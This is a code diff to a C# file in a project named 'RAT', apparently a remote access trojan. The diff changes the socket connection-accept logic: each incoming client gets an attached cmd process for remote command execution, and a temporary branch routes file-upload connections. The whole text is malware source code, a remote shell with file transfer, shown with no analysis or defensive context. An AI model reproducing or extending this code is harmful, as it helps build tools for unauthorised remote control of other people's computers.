@@ -1,6 +1,7 @@
 ﻿using RAT.src.Cmd;
 using RAT.src.Interfaces;
 using RAT.src.Models;
+using RAT.src.Models.Enums;
 using System;
 using System.Diagnostics;
 using System.Net.Sockets;
@@ -12,9 +13,9 @@ namespace RAT.src.Logic.Sockets.Connection
     /// </summary>
     public class SocketConnectionAcceptLogic : ISocketConnectionAcceptLogic
     {
-        private ISocketStateLogic _socketStateLogic { get; }
-        private ISocketConnectionReceiveLogic _socketConnectionReceiveLogic { get; }
-        private ICmdLogic _cmdLogic { get; }
+        private readonly ISocketStateLogic _socketStateLogic;
+        private readonly ISocketConnectionReceiveLogic _socketConnectionReceiveLogic;
+        private readonly ICmdLogic _cmdLogic;
 
         /// <summary>
         /// Logic related to connection acceptance stage.
@@ -54,11 +55,20 @@ namespace RAT.src.Logic.Sockets.Connection
             Socket listener = (Socket)res.AsyncState;
             Socket handler = listener.EndAccept(res);
 
+            // ---- TEMP
+            if (_socketStateLogic.State?.CurrentOperation == CurrentOperation.FileUpload)
+            {
+                _socketStateLogic.State.ClientFileUploadSocket = handler;
+                _socketConnectionReceiveLogic.BeginDataReceive(handler);
+                return;
+            }
+            // ---- TEMP
+
             // Create the state object with cmd process attached to client.
             // This represents client with all needed information.
             var clientState = new StateObject()
             {
-                ClientSocket = handler,
+                ClientMainSocket = handler,
                 ClientCmdProcess = new Process()
                 {
                     StartInfo = new CmdConfigurator().GetCmdStartupConfiguration(),
@@ -77,7 +87,7 @@ namespace RAT.src.Logic.Sockets.Connection
             clientState.ClientCmdProcess.BeginErrorReadLine();
 
             // We are ready to receive cmd commands.
-            _socketConnectionReceiveLogic.BeginCommandReceive(handler);
+            _socketConnectionReceiveLogic.BeginDataReceive(handler);
         }
     }
 }
